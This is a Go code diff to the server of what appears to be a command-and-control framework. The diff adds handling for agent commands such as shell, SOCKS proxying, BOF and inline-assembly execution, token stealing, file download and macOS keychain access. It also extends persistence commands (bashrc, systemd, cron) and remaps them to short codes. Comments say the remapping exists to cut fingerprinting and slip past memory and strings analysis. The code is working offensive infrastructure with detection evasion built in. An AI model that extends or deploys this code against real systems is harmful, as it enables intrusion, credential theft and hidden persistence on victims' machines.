@@ -320,6 +320,7 @@ func (h *WSHandler) forwardChunkToAgent(client *hub.Client, data struct {
 		"currentChunk": data.CurrentChunk,
 		"totalChunks":  data.TotalChunks,
 		"data":         chunkData,
+		"arguments":    data.Arguments,
 		"timestamp":    data.Timestamp,
 		"username":     username,
 	}
@@ -495,6 +496,118 @@ func (h *WSHandler) processSingleCommand(client *hub.Client, data struct {
 		data.Command = transformPersistFlags(data.Command)
 	}
 
+	// Handle shell commands - inject server-side templates and transform flags
+	if strings.HasPrefix(data.Command, "shell") {
+		log.Printf("Processing shell command for agent: %s - injecting templates", data.AgentID)
+		data.Data = injectShellTemplate()
+		data.Command = templates.TransformShellFlags(data.Command)
+	}
+
+	// Handle link/unlink/links commands - inject server-side templates
+	if data.Command == "link" || strings.HasPrefix(data.Command, "link ") ||
+		data.Command == "unlink" || strings.HasPrefix(data.Command, "unlink ") ||
+		data.Command == "links" {
+		log.Printf("Processing link command for agent: %s - injecting templates", data.AgentID)
+		data.Data = injectLinkTemplate()
+	}
+
+	// Handle socks command - merge template into existing JSON data
+	if data.Command == "socks" || strings.HasPrefix(data.Command, "socks ") {
+		log.Printf("Processing socks command for agent: %s - merging template", data.AgentID)
+		data.Data = mergeSocksTemplate(data.Data)
+	}
+
+	// Handle ps command - inject template and transform flags
+	if data.Command == "ps" || strings.HasPrefix(data.Command, "ps ") {
+		log.Printf("Processing ps command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectPsTemplate()
+		data.Command = templates.TransformPsFlags(data.Command)
+	}
+
+	// Handle ls command - inject template and transform flags
+	if data.Command == "ls" || strings.HasPrefix(data.Command, "ls ") {
+		log.Printf("Processing ls command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectLsTemplate()
+		data.Command = templates.TransformLsFlags(data.Command)
+	}
+
+	// Handle rm command - inject template and transform flags
+	if data.Command == "rm" || strings.HasPrefix(data.Command, "rm ") {
+		log.Printf("Processing rm command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectRmTemplate()
+		data.Command = templates.TransformRmFlags(data.Command)
+	}
+
+	// Handle hash command - inject template and transform flags
+	if data.Command == "hash" || strings.HasPrefix(data.Command, "hash ") {
+		log.Printf("Processing hash command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectHashTemplate()
+		data.Command = templates.TransformHashFlags(data.Command)
+	}
+
+	// Handle sudo-session command - inject template
+	if strings.HasPrefix(data.Command, "sudo-session") {
+		log.Printf("Processing sudo-session command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectSudoSessTemplate()
+	}
+
+	// Handle BOF commands - inject template
+	// Matches: bof, bof-async, bof-jobs, bof-output, bof-kill
+	if data.Command == "bof" || strings.HasPrefix(data.Command, "bof ") ||
+		data.Command == "bof-async" || strings.HasPrefix(data.Command, "bof-async ") ||
+		data.Command == "bof-jobs" || data.Command == "bof-output" ||
+		strings.HasPrefix(data.Command, "bof-output ") ||
+		data.Command == "bof-kill" || strings.HasPrefix(data.Command, "bof-kill ") {
+		log.Printf("Processing BOF command for agent: %s - injecting template", data.AgentID)
+		// For BOF commands, merge template with existing data (if any)
+		if data.Data == "" {
+			data.Data = injectBOFTemplate()
+		} else {
+			// Merge template into existing BOF data
+			data.Data = mergeBOFTemplate(data.Data)
+		}
+	}
+
+	// Handle inline-assembly commands - inject template
+	// Matches: inline-assembly, inline-assembly-async, inline-assembly-jobs, etc.
+	if strings.HasPrefix(data.Command, "inline-assembly") {
+		log.Printf("Processing inline-assembly command for agent: %s - injecting template", data.AgentID)
+		// Merge template into existing inline-assembly data
+		data.Data = mergeInlineAssemblyTemplate(data.Data)
+	}
+
+	// Handle token commands - inject template
+	// Matches: token, token create, token steal, token list, etc.
+	if data.Command == "token" || strings.HasPrefix(data.Command, "token ") {
+		log.Printf("Processing token command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectTokenTemplate()
+	}
+
+	// Handle rev2self command - inject template
+	if data.Command == "rev2self" || strings.HasPrefix(data.Command, "rev2self ") {
+		log.Printf("Processing rev2self command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectRev2SelfTemplate()
+	}
+
+	// Handle download command - inject template
+	if data.Command == "download" || strings.HasPrefix(data.Command, "download ") {
+		log.Printf("Processing download command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectDownloadTemplate()
+	}
+
+	// Handle whoami command - inject template
+	if data.Command == "whoami" || strings.HasPrefix(data.Command, "whoami ") {
+		log.Printf("Processing whoami command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectWhoamiTemplate()
+	}
+
+	// Handle keychain command (Darwin only) - inject template and transform flags
+	if data.Command == "keychain" || strings.HasPrefix(data.Command, "keychain ") {
+		log.Printf("Processing keychain command for agent: %s - injecting template", data.AgentID)
+		data.Data = injectKeychainTemplate()
+		data.Command = templates.TransformKeychainFlags(data.Command)
+	}
+
 	// Use message username if provided (e.g., from REST API proxy), otherwise fall back to client username
 	username := data.Username
 	if username == "" {
@@ -540,6 +653,7 @@ func (h *WSHandler) processSingleCommand(client *hub.Client, data struct {
 		"currentChunk": data.CurrentChunk,
 		"totalChunks":  data.TotalChunks,
 		"data":         data.Data,
+		"arguments":    data.Arguments,
 		"timestamp":    data.Timestamp,
 		"username":     username,
 	}
@@ -899,9 +1013,280 @@ func injectPersistenceTemplate(command string) string {
 	return encoded
 }
 
-// transformPersistFlags transforms user-friendly persist flags to short obscure flags
+// injectShellTemplate returns base64-encoded shell template data
+func injectShellTemplate() string {
+	template := templates.GetShellTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize shell template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected shell template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectLinkTemplate returns base64-encoded link template data
+func injectLinkTemplate() string {
+	template := templates.GetLinkTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize link template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected link template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// mergeSocksTemplate merges the socks template into existing JSON data
+// Socks data is special - it contains configuration that gets merged with the template
+func mergeSocksTemplate(existingData string) string {
+	if existingData == "" {
+		return existingData
+	}
+
+	// Parse existing socks config
+	var socksConfig map[string]interface{}
+	if err := json.Unmarshal([]byte(existingData), &socksConfig); err != nil {
+		log.Printf("Failed to parse existing socks data: %v", err)
+		return existingData
+	}
+
+	// Get the template
+	template := templates.GetSocksTemplate()
+	if template == nil {
+		return existingData
+	}
+
+	// Add template fields to socks config
+	socksConfig["tpl"] = template.Templates
+	socksConfig["v"] = template.Version
+	socksConfig["t"] = template.Type
+
+	// Re-serialize
+	mergedJSON, err := json.Marshal(socksConfig)
+	if err != nil {
+		log.Printf("Failed to serialize merged socks data: %v", err)
+		return existingData
+	}
+
+	log.Printf("Merged socks template into config (%d bytes)", len(mergedJSON))
+	return string(mergedJSON)
+}
+
+// injectPsTemplate returns base64-encoded ps template data
+func injectPsTemplate() string {
+	template := templates.GetPsTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize ps template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected ps template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectLsTemplate returns base64-encoded ls template data
+func injectLsTemplate() string {
+	template := templates.GetLsTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize ls template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected ls template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectRmTemplate returns base64-encoded rm template data
+func injectRmTemplate() string {
+	template := templates.GetRmTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize rm template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected rm template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectHashTemplate returns base64-encoded hash template data
+func injectHashTemplate() string {
+	template := templates.GetHashTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize hash template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected hash template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectSudoSessTemplate returns base64-encoded sudo session template data
+func injectSudoSessTemplate() string {
+	template := templates.GetSudoSessTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize sudo-session template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected sudo-session template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectBOFTemplate returns base64-encoded BOF template data
+func injectBOFTemplate() string {
+	template := templates.GetBOFTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize BOF template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected BOF template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// mergeBOFTemplate merges the BOF template into existing BOF data
+// BOF data may contain metadata like arch, bof bytes, arguments etc.
+func mergeBOFTemplate(existingData string) string {
+	if existingData == "" {
+		return injectBOFTemplate()
+	}
+
+	// Try to parse existing data as JSON
+	var bofConfig map[string]interface{}
+	if err := json.Unmarshal([]byte(existingData), &bofConfig); err != nil {
+		// Not JSON - might be raw base64 BOF data, wrap it with template
+		template := templates.GetBOFTemplate()
+		if template == nil {
+			return existingData
+		}
+
+		// Create a wrapper with the template and original data
+		wrapper := map[string]interface{}{
+			"tpl":      template.Templates,
+			"v":        template.Version,
+			"t":        template.Type,
+			"bof_data": existingData, // Preserve original BOF data
+		}
+
+		wrappedJSON, err := json.Marshal(wrapper)
+		if err != nil {
+			log.Printf("Failed to wrap BOF data with template: %v", err)
+			return existingData
+		}
+
+		log.Printf("Wrapped BOF data with template (%d bytes)", len(wrappedJSON))
+		return string(wrappedJSON)
+	}
+
+	// Get the template
+	template := templates.GetBOFTemplate()
+	if template == nil {
+		return existingData
+	}
+
+	// Add template fields to BOF config
+	bofConfig["tpl"] = template.Templates
+	bofConfig["v"] = template.Version
+	bofConfig["t"] = template.Type
+
+	// Re-serialize
+	mergedJSON, err := json.Marshal(bofConfig)
+	if err != nil {
+		log.Printf("Failed to serialize merged BOF data: %v", err)
+		return existingData
+	}
+
+	log.Printf("Merged BOF template into config (%d bytes)", len(mergedJSON))
+	return string(mergedJSON)
+}
+
+// transformPersistFlags transforms user-friendly persist flags and method names to short codes
 // This reduces the fingerprinting surface in agent memory
 func transformPersistFlags(command string) string {
+	// Split command to handle method names specially
+	parts := strings.Fields(command)
+	if len(parts) < 2 {
+		return command
+	}
+
+	// Transform method name (second word after "persist")
+	// persist bashrc → persist b
+	// persist systemd → persist s
+	// persist cron → persist c
+	// persist remove → persist r
+	methodTransforms := map[string]string{
+		"bashrc":  "b",
+		"systemd": "s",
+		"cron":    "c",
+		"remove":  "r",
+	}
+
+	if newMethod, ok := methodTransforms[parts[1]]; ok {
+		parts[1] = newMethod
+	}
+
+	// For "persist remove <type>", also transform the removal type
+	// persist remove bashrc → persist r b
+	// persist remove systemd → persist r s
+	// persist remove cron → persist r c
+	if len(parts) >= 3 && parts[1] == "r" {
+		if newType, ok := methodTransforms[parts[2]]; ok {
+			parts[2] = newType
+		}
+	}
+
+	// Rejoin after method transformation
+	result := strings.Join(parts, " ")
+
 	// Flag transformations (user-friendly → obscure)
 	// These short flags are less obvious in memory/strings analysis
 	// Order matters: longer flags first to avoid partial matches (e.g., --files before --file)
@@ -925,16 +1310,184 @@ func transformPersistFlags(command string) string {
 		// Persist-cron specific flags
 		{"--method", "-m"},
 		{"--interval", "-i"},
+		// Cron method values (spool, crond, periodic, anacron, timer, all)
+		{" spool", " sp"},
+		{" crond", " cd"},
+		{" periodic", " pr"},
+		{" anacron", " an"},
+		{" timer", " tm"},
+		// " all" already short, but let's use "al" for consistency
 	}
 
-	result := command
 	for _, r := range replacements {
 		result = strings.ReplaceAll(result, r.from, r.to)
 	}
 
 	if result != command {
-		log.Printf("Transformed persist flags: %s → %s", command, result)
+		log.Printf("Transformed persist command: %s → %s", command, result)
 	}
 
 	return result
+}
+
+// injectInlineAssemblyTemplate returns base64-encoded inline assembly template data
+func injectInlineAssemblyTemplate() string {
+	template := templates.GetInlineAssemblyTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize inline-assembly template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected inline-assembly template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// mergeInlineAssemblyTemplate merges the inline assembly template into existing data
+func mergeInlineAssemblyTemplate(existingData string) string {
+	if existingData == "" {
+		return injectInlineAssemblyTemplate()
+	}
+
+	// Try to parse existing data as JSON
+	var iaConfig map[string]interface{}
+	if err := json.Unmarshal([]byte(existingData), &iaConfig); err != nil {
+		// Not JSON - wrap it with template
+		template := templates.GetInlineAssemblyTemplate()
+		if template == nil {
+			return existingData
+		}
+
+		wrapper := map[string]interface{}{
+			"tpl":     template.Templates,
+			"v":       template.Version,
+			"t":       template.Type,
+			"ia_data": existingData,
+		}
+
+		wrappedJSON, err := json.Marshal(wrapper)
+		if err != nil {
+			log.Printf("Failed to wrap inline-assembly data with template: %v", err)
+			return existingData
+		}
+
+		log.Printf("Wrapped inline-assembly data with template (%d bytes)", len(wrappedJSON))
+		return string(wrappedJSON)
+	}
+
+	// Get the template
+	template := templates.GetInlineAssemblyTemplate()
+	if template == nil {
+		return existingData
+	}
+
+	// Add template fields to config
+	iaConfig["tpl"] = template.Templates
+	iaConfig["v"] = template.Version
+	iaConfig["t"] = template.Type
+
+	// Re-serialize
+	mergedJSON, err := json.Marshal(iaConfig)
+	if err != nil {
+		log.Printf("Failed to serialize merged inline-assembly data: %v", err)
+		return existingData
+	}
+
+	log.Printf("Merged inline-assembly template into config (%d bytes)", len(mergedJSON))
+	return string(mergedJSON)
+}
+
+// injectTokenTemplate returns base64-encoded token template data
+func injectTokenTemplate() string {
+	template := templates.GetTokenTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize token template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected token template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectRev2SelfTemplate returns base64-encoded rev2self template data
+func injectRev2SelfTemplate() string {
+	template := templates.GetRev2SelfTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize rev2self template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected rev2self template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectDownloadTemplate returns base64-encoded download template data
+func injectDownloadTemplate() string {
+	template := templates.GetDownloadTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize download template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected download template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectWhoamiTemplate returns base64-encoded whoami template data
+func injectWhoamiTemplate() string {
+	template := templates.GetWhoamiTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize whoami template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected whoami template (%d bytes encoded)", len(encoded))
+	return encoded
+}
+
+// injectKeychainTemplate returns base64-encoded keychain template data (Darwin only)
+func injectKeychainTemplate() string {
+	template := templates.GetKeychainTemplate()
+	if template == nil {
+		return ""
+	}
+
+	jsonData, err := template.ToJSON()
+	if err != nil {
+		log.Printf("Failed to serialize keychain template: %v", err)
+		return ""
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(jsonData)
+	log.Printf("Injected keychain template (%d bytes encoded)", len(encoded))
+	return encoded
 }
